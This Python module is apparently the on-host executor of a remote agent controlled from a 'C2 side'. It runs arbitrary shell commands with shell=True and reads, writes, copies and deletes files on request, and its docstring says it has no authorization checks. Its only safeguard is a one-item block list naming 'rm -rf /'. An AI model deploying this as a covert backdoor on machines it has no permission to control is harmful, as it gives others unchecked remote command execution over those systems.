"""Local command executor on remote Agent.

Provides file/shell command execution derived from the sample Localaw
(FileModule + CommandModule). No LLM, no safety/authorization - C2 side
owns all policy decisions.
"""

import platform
import shutil
import subprocess
from pathlib import Path


FORBIDDEN_PATTERNS = ["rm -rf /"]


def _check_safety(cmd: str) -> bool:
    cmd_lower = cmd.lower()
    for pattern in FORBIDDEN_PATTERNS:
        if pattern.lower() in cmd_lower:
            return False
    return True


def list_dir(path: str = ".") -> str:
    try:
        target = Path(path).resolve()
        if not target.exists():
            return f"Path does not exist: {path}"
        if target.is_file():
            return f"{path} is a file"
        items = []
        for item in target.iterdir():
            item_type = "DIR" if item.is_dir() else "FILE"
            size = item.stat().st_size if item.is_file() else 0
            items.append(f"{item_type:6} {str(size):>12} {item.name}")
        return "\n".join(items) if items else "Empty directory"
    except Exception as e:
        return f"Error listing directory: {str(e)}"


def create_dir(path: str) -> str:
    try:
        target = Path(path).resolve()
        if target.exists():
            return f"Directory already exists: {path}"
        target.mkdir(parents=True, exist_ok=True)
        return f"Successfully created directory: {path}"
    except Exception as e:
        return f"Error creating directory: {str(e)}"


def get_cwd() -> str:
    try:
        return str(Path.cwd().resolve())
    except Exception as e:
        return f"Error getting cwd: {str(e)}"


def create_file(path: str) -> str:
    try:
        target = Path(path).resolve()
        if target.exists():
            return f"File already exists: {path}"
        target.parent.mkdir(parents=True, exist_ok=True)
        target.touch()
        return f"Successfully created file: {path}"
    except Exception as e:
        return f"Error creating file: {str(e)}"


def delete(path: str) -> str:
    try:
        target = Path(path).resolve()
        if not target.exists():
            return f"Path does not exist: {path}"
        if target.is_dir():
            shutil.rmtree(target)
        else:
            target.unlink()
        return f"Successfully deleted: {path}"
    except Exception as e:
        return f"Error deleting: {str(e)}"


def rename(path: str, new_name: str) -> str:
    try:
        target = Path(path).resolve()
        if not target.exists():
            return f"Path does not exist: {path}"
        new_path = target.parent / new_name
        if new_path.exists():
            return f"Target name already exists: {new_name}"
        target.rename(new_path)
        return f"Successfully renamed: {path} -> {new_name}"
    except Exception as e:
        return f"Error renaming: {str(e)}"


def read_file(path: str, start_line: str = "0", end_line: str = "0") -> str:
    try:
        target = Path(path).resolve()
        if not target.exists():
            return f"File does not exist: {path}"
        if target.is_dir():
            return f"{path} is a directory"
        with open(target, "r", encoding="utf-8") as f:
            lines = f.readlines()
        if start_line in (0, "", None) or start_line == "0":
            return "".join(lines)[:50000]
        try:
            start = max(0, int(start_line) - 1)
            end = int(end_line) if end_line not in (0, "", None) else len(lines)
        except ValueError:
            return f"Invalid line numbers: start_line={start_line}, end_line={end_line}"
        end = min(len(lines), end)
        if start >= len(lines):
            return f"Start line {start_line} exceeds file line count ({len(lines)})"
        return "".join(lines[start:end])
    except Exception as e:
        return f"Error reading file: {str(e)}"


def write_file(path: str, content: str) -> str:
    try:
        target = Path(path).resolve()
        target.parent.mkdir(parents=True, exist_ok=True)
        with open(target, "w", encoding="utf-8") as f:
            f.write(content)
        return f"Successfully wrote to: {path}"
    except Exception as e:
        return f"Error writing file: {str(e)}"


def edit_file(path: str, operation: str, start_line: str, end_line: str, content: str = "") -> str:
    try:
        target = Path(path).resolve()
        if not target.exists():
            return f"File does not exist: {path}"
        if target.is_dir():
            return f"{path} is a directory"
        with open(target, "r", encoding="utf-8") as f:
            lines = f.readlines()
        try:
            start = max(0, int(start_line) - 1)
            end = int(end_line) if end_line not in (0, "", None) else 0
        except ValueError:
            return f"Invalid line numbers: start_line={start_line}, end_line={end_line}"
        if operation == "add":
            insert_pos = start
            lines.insert(insert_pos, content + "\n")
        elif operation == "del":
            end = min(len(lines), end)
            if start >= len(lines):
                return f"Start line {start_line} exceeds file line count ({len(lines)})"
            del lines[start:end]
        elif operation == "modify":
            end = min(len(lines), end)
            if start >= len(lines):
                return f"Start line {start_line} exceeds file line count ({len(lines)})"
            del lines[start:end]
            lines.insert(start, content + "\n")
        else:
            return f"Unknown operation: {operation}. Use 'add', 'del', or 'modify'"
        with open(target, "w", encoding="utf-8") as f:
            f.writelines(lines)
        return f"Successfully performed {operation} on file: {path}"
    except Exception as e:
        return f"Error editing file: {str(e)}"


def copy(src: str, dest: str) -> str:
    try:
        src_path = Path(src)
        dest_path = Path(dest)
        if not src_path.exists():
            return f"Source not found: {src}"
        if src_path.is_dir():
            shutil.copytree(src_path, dest_path)
        else:
            dest_path.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(src_path, dest_path)
        return f"Successfully copied: {src} -> {dest}"
    except Exception as e:
        return f"Error copying: {str(e)}"


def move(src: str, dest: str) -> str:
    try:
        src_path = Path(src)
        dest_path = Path(dest)
        if not src_path.exists():
            return f"Source not found: {src}"
        dest_path.parent.mkdir(parents=True, exist_ok=True)
        shutil.move(str(src_path), str(dest_path))
        return f"Successfully moved: {src} -> {dest}"
    except Exception as e:
        return f"Error moving: {str(e)}"


def exec_cmd(cmd: str, timeout: int = 60) -> str:
    if not cmd:
        return "Error: Empty command"
    if not _check_safety(cmd):
        return "Error: Command blocked due to safety concerns"
    try:
        encoding = "cp936" if platform.system() == "Windows" else "utf-8"
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            encoding=encoding,
            errors="replace",
            timeout=timeout,
        )
        output = []
        if result.stdout:
            output.append(result.stdout)
        if result.stderr:
            output.append(result.stderr)
        if result.returncode != 0 and not output:
            output.append(f"Exit code: {result.returncode}")
        return (
            "\n".join(output)
            if output
            else "Command executed successfully (no output)"
        )
    except subprocess.TimeoutExpired:
        return f"Error: Command timed out after {timeout} seconds"
    except Exception as e:
        return f"Error: {str(e)}"


ACTION_HANDLERS = {
    "get_cwd":     lambda p: get_cwd(),
    "list_dir":    lambda p: list_dir(p[0]),
    "make_dir":    lambda p: create_dir(p[0]),
    "create_file": lambda p: create_file(p[0]),
    "delete_dir":  lambda p: delete(p[0]),
    "rename_dir":  lambda p: rename(p[0], p[1]),
    "read_file":   lambda p: read_file(p[0], p[1], p[2]),
    "write_file":  lambda p: write_file(p[0], p[1]),
    "delete_file": lambda p: delete(p[0]),
    "edit_file":   lambda p: edit_file(p[0], p[1], p[2], p[3], p[4]),
    "rename_file": lambda p: rename(p[0], p[1]),
    "copy":        lambda p: copy(p[0], p[1]),
    "move":        lambda p: move(p[0], p[1]),
    "exec_cmd":    lambda p: exec_cmd(p[0]),
}


def execute(action: str, params: list, cmd_timeout: int = 60) -> str:
    handler = ACTION_HANDLERS.get(action)
    if not handler:
        return f"Error: Unknown action: {action}"
    if action == "exec_cmd":
        return exec_cmd(params[0] if params else "", timeout=cmd_timeout)
    try:
        return handler(params)
    except Exception as e:
        return f"Error: {str(e)}"